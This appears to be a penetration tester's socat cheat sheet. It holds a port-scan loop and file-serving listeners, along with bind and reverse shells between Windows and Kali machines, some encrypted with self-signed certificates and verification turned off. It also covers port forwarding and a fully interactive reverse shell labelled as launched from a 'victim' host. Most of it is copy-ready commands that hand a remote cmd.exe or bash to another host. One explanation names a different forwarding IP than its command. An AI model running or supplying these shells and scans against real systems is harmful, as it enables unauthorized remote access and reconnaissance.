> Socat (for SOcket CAT) establishes two bidirectional byte streams and transfers data between them. Data channels may be files, pipes, devices (terminal or modem, etc.), or sockets (Unix, IPv4, IPv6, raw, UDP, TCP, SSL). It provides forking, logging and tracing, different modes for interprocess communication and many more options.


# Download

Download binaries
```
https://github.com/3ndG4me/socat/releases
```

# Port Scanning

#Port_Scanning 

Bash script to perform a TCP port scan on ports 1 to 10000
```bash
for ((port=1; port<=10000; port++)); do socat -v - TCP:192.168.69.123:$port; done
```

# File Transfer

#File_Sharing 

Start listener on port 4444 to allow file to be downloaded E.g., `powercat.ps1`
```bash
sudo socat TCP4-LISTEN:4444,fork file:powercat.ps1
```

#Shell_Access #Remote_Access

# Bind shell from Windows machine to Kali machine
1. Windows Machine: Create bind shell listener
```
socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
```
2. Linux Machine: Connect to bind shell
```
socat - TCP4:192.168.69.123:443
```

# Encrypted bind shell from Kali machine to Windows machine
1. Linux Machine: Create a self-signed certificate
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
2. Linux Machine: Create the .pem file
```
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
3. Linux Machine: Start encrypted bind shell listener
```
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
4. Windows Machine: Connect to encrypted bind shell
```
socat - OPENSSL:192.168.69.123:443,verify=0
```

# Encrypted bind shell from Windows machine to Kali machine
1. Windows Machine: Download Socat
```
https://github.com/tech128/socat-1.7.3.0-windows
```
2. Windows Machine: Download openssl and add to PATH
```
https://slproweb.com/products/Win32OpenSSL.html
```
3. Windows Machine: Create a self-signed certificate using openssl
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
4. Windows Machine: Create .pem file
```
type bind_shell.key bind_shell.crt > bind_shell.pem
```
5. Windows Machine: Start encrypted bind shell listener
```
socat OPENSSL-LISTEN:4443,cert=bind_shell.pem,verify=0,fork EXEC:'cmd.exe',pipes
```
6. Linux Machine: Connect to encrypted bind shell
```
socat - OPENSSL:192.168.69.123:4443,verify=0
```

# Encrypted reverse shell from Windows machine to Kali machine
1. Windows Machine: Download Socat
```
https://github.com/tech128/socat-1.7.3.0-windows
```
2. Windows Machine: Download openssl and add to PATH
```
https://slproweb.com/products/Win32OpenSSL.html
```
3. Windows Machine: Create a self-signed certificate using openssl
```
openssl req -newkey rsa:2048 -nodes -keyout reverse_shell.key -x509 -days 362 -out reverse_shell.crt
```
4. Windows Machine: Create .pem file
```
type reverse_shell.key reverse_shell.crt > reverse_shell.pem
```
5. Windows Machine: Create a listener
```
socat -d -d OPENSSL-LISTEN:4443,cert=reverse_shell.pem,verify=0,fork STDOUT
```
6. Linux Machine: Send a reverse shell
```
socat OPENSSL:192.168.69.123:4443,verify=0 EXEC:/bin/bash
```

# Encrypted reverse shell from Kali machine to Windows machine
1. Linux Machine: Create a self-signed certificate
```
openssl req -newkey rsa:2048 -nodes -keyout reverse_shell.key -x509 -days 362 -out reverse_shell.crt
```
2. Linux Machine: Create the .pem file
```
cat reverse_shell.key reverse_shell.crt > reverse_shell.pem
```
3. Linux Machine: Create a listener
```
socat -d -d OPENSSL-LISTEN:6969,cert=reverse_shell.pem,verify=0,fork STDOUT
```
4. Windows Machine: Send a reverse shell
```
socat OPENSSL:192.168.69.123:6969,verify=0 EXEC:'cmd.exe',pipes
```

#Port_Forwarding 

## Local Port Forwarding

Socat local port forward command
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.69.169:5432
```
- Start a verbose (`-ddd`) Socat process. 
- Listen on TCP port 2345 (`TCP-LISTEN:2345`)
- Fork into a new subprocess when it receives a connection (`fork`) instead of dying after a single connection, 
- Forward all received traffic to TCP port 5432 on 10.4.50.215 (`TCP:10.4.69.169:5432`)

#Full_Interactive_Shell 

## Socat TTY Shell 

Own Kali listener
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Victim Linux launch reverse shell
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.1.2.6:4444
```
